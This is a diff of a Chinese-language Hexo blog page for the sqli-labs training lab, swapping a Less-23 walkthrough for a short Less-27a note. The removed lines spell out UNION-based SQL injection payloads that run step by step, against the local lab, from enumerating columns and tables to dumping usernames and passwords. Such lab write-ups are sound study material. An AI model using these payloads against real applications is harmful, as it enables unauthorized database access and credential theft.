@@ -5,22 +5,19 @@
   
 
   
-  <title>sql-labs-Less-23 | Hexo</title>
+  <title>sql-labs-Less-27a | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-23，输入?id&#x3D;1 正常输出。输入’发生报错： 查看源代码： 发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。再输入一个’，又正常了，说明可以用’注入。注入：查列数：id&#x3D;1’union select 1,2,3’查输出位置：id&#x3D;-1’union select 1,2,3’爆库：id&#x3D;-1’union select 1,da">
+  <meta name="description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-27a&#x2F;，输入?id&#x3D;1&#39;，正常输出，把&#39;换成&quot;出现错误但没有回显，在输入一个&quot;正常输出。说明可以用”注入，但不可以用报错注入。剩下的和Less-26a差不多，这关用闭合法。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql-labs-Less-23">
-<meta property="og:url" content="http://example.com/2021/02/13/sql-labs-Less-23/index.html">
+<meta property="og:title" content="sql-labs-Less-27a">
+<meta property="og:url" content="http://example.com/2021/02/17/sql-labs-Less-27a/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-23，输入?id&#x3D;1 正常输出。输入’发生报错： 查看源代码： 发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。再输入一个’，又正常了，说明可以用’注入。注入：查列数：id&#x3D;1’union select 1,2,3’查输出位置：id&#x3D;-1’union select 1,2,3’爆库：id&#x3D;-1’union select 1,da">
+<meta property="og:description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-27a&#x2F;，输入?id&#x3D;1&#39;，正常输出，把&#39;换成&quot;出现错误但没有回显，在输入一个&quot;正常输出。说明可以用”注入，但不可以用报错注入。剩下的和Less-26a差不多，这关用闭合法。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png">
-<meta property="article:published_time" content="2021-02-13T08:29:16.000Z">
-<meta property="article:modified_time" content="2021-02-14T05:22:21.368Z">
+<meta property="article:published_time" content="2021-02-17T07:12:02.000Z">
+<meta property="article:modified_time" content="2021-02-17T11:15:04.461Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -69,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-sql-labs-Less-23" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-sql-labs-Less-27a" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/02/13/sql-labs-Less-23/" class="article-date">
-  <time datetime="2021-02-13T08:29:16.000Z" itemprop="datePublished">2021-02-13</time>
+    <a href="/2021/02/17/sql-labs-Less-27a/" class="article-date">
+  <time datetime="2021-02-17T07:12:02.000Z" itemprop="datePublished">2021-02-17</time>
 </a>
     
   </div>
@@ -83,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      sql-labs-Less-23
+      sql-labs-Less-27a
     </h1>
   
 
@@ -91,15 +88,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23%EF%BC%8C%E8%BE%93%E5%85%A5?id=1">http://127.0.0.1/sql/Less-23，输入?id=1</a> 正常输出。<br>输入’发生报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png" alt="1"><br>查看源代码：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png" alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’union select 1,2,3’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
-<p>ps:可以报错注入，延时注入，可以利用 or ‘1’=’1进行闭合。<br>这里不能用order by去判断列数，因为无论order by 多少都不报错，可以理解为order by 在执行的时候被忽略了，这是由于mysql解析顺序决定的。<br>（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/annsshadow/p/5037667.html%EF%BC%89">https://www.cnblogs.com/annsshadow/p/5037667.html）</a></p>
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27a/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1&#39;%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E6%8A%8A&#39;%E6%8D%A2%E6%88%90&quot;%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%E4%BD%86%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA&quot;%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%E3%80%82">http://127.0.0.1/sql/Less-27a/，输入?id=1&#39;，正常输出，把&#39;换成&quot;出现错误但没有回显，在输入一个&quot;正常输出。</a><br>说明可以用”注入，但不可以用报错注入。剩下的和Less-26a差不多，这关用闭合法。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/13/sql-labs-Less-23/" data-id="ckl3x2oxo00000suxc3yh64sl" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/17/sql-labs-Less-27a/" data-id="ckl9ceyb80000q8uxa5wt9rb3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -108,19 +102,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/02/14/sql-labs-Less-24/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sql-labs-Less-24
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/02/12/sql-labs-Less-21~22/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/17/sql-labs-Less-27/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sql-labs-Less-21~22</div>
+      <div class="article-nav-title">sql-labs-Less-27</div>
     </a>
   
 </nav>
